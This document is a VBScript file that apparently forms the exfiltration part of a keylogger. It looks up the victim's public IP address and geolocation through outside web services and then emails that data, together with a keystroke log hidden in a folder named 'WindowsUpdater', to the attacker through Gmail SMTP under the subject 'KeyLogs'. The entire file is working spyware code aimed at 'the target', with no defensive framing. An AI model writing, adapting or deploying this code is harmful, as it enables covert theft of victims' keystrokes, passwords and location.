Option Explicit
Dim emailObject, email, password, body
Dim objHTTP, strURL, MyIP_WinHTTP, objHTTP2, strURL2, geoLocation, geoObj

email="user@gmail.com" 'Set your email username here
password="<APP PASSWORD>" 'Set your email password here (Disclaimer: USE APP PASSWORD AND 2F AUTH SHOULD BE TURNED ON)

Sub getGeoLocation()
    MyIP_WinHTTP = "0.0.0.0" 'If we fail to get the IP Address
    strURL = "https://api.ipify.org"
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
    objHTTP.Open "GET", strURL
    objHTTP.Send 'Sending GET request to api.ipify.org to get the target's IP Address
    If objHTTP.Status = 200 Then MyIP_WinHTTP = objHTTP.ResponseText
    Set objHTTP = Nothing

    Set objHTTP2 = CreateObject("WinHttp.WinHttpRequest.5.1")
    strURL2 = "http://ip-api.com/json/"+MyIP_WinHTTP
    objHTTP2.Open "GET", strURL2
    objHTTP2.Send 'Sending the IP address to ip-api.com to get target's location and network information.
    If objHTTP2.Status=200 Then geoLocation = objHTTP2.ResponseText

    body=MyIP_WinHTTP & vbLf & geoLocation 'Storing IP address of target, followed by his/her location and network information in the email body to be sent.
End Sub

Sub sendEmail() 
    Set emailObject = CreateObject("CDO.Message") 
    emailObject.Subject = "KeyLogs" 'Email Subject
    emailObject.To = "" 'Reeciepient of Email
    emailObject.From = "" 'Sender of Email
    emailObject.TextBody = body
    emailObject.AddAttachment "C:\Program69\WindowsUpdater\log.txt"  'Adding the generated log file

    emailObject.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
    
    'Name or IP of Remote SMTP Server
    emailObject.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"

    emailObject.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1

    'Setting EMAIL 
    emailObject.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/sendusername") = email

    'Setting PASSWORD
    emailObject.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/sendpassword") = password

    'Server PORT
    emailObject.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = "25"

    'Use SSL for the connection
    emailObject.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True

    'Connection Timeout 
    emailObject.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout") = 30

    emailObject.Configuration.Fields.Update
    emailObject.Send 'Sends email
End Sub

getGeoLocation()
sendEmail()